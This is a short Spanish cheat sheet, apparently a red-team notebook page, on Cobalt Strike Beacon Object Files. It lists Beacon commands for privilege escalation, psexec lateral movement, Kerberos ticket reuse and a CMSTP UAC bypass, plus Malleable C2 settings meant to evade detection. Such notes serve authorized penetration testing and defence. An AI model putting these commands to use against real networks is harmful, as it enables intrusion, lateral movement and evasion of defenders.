---
title: Cobalt Strike — Inline Commands (BOF)
tags: [cobalt-strike, beacon, cheatsheet, bof, inline, opsec]
---

# Inline Commands (BOF)

Los BOFs (Beacon Object Files) se ejecutan **directamente en el hilo del Beacon** — sin procesos nuevos, sin inyección.

## Comandos inline nativos de CS

| Comando | Descripción |
|---------|-------------|
| `clipboard` | Ver portapapeles |
| `getsystem` | Elevar a SYSTEM |
| `jump psexec <host> <listener>` | Movimiento lateral via psexec |
| `kerberos_ticket_use <ccache>` | Usar ticket Kerberos |
| `reg query x64 <key>` | Consultar registro |
| `runasadmin uac-cmstplua <cmd>` | Bypass UAC via CMSTP |
| `inline-execute <bof.o> [args]` | Ejecutar BOF personalizado |

## Configuración OPSEC para BOFs (Malleable C2)

```
stage {
    set bof_allocator   "VirtualAlloc";   # Asignación de memoria para BOF
    set bof_reuse_memory "true";          # Reutilizar páginas de memoria
    set min_alloc       "4096";           # Mínimo de memoria a asignar
    set startrwx        "false";          # No RWX al inicio
    set userwx          "false";          # No permisos W+X simultáneos
}
```

> [!important] Los BOFs corren en el hilo principal del Beacon:
> - **No crean nuevos procesos**
> - **No crean nuevos threads**
> - Si el BOF crashea → el Beacon muere
> - Mantenerlos pequeños y testeados

> [!tip] Preferir BOFs sobre Fork & Run cuando el BOF existe para la tarea — es mucho más silencioso.
